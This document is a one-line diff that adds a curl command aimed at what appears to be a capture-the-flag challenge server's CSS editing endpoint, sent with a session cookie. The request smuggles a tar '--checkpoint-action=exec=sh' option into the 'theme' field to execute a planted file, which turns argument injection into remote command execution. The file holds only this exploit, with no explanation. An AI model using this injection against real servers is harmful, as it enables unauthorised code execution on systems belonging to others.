@@ -1,0 +1,1 @@
+curl --cookie "PHPSESSID=mk1lmshlv4ptuchrmetah1qvcl" https://pasteweb.ctf.zoolab.org/editcss.php -L -d "less=p{content:hi}&theme=--checkpoint-action=exec=sh index.html||"
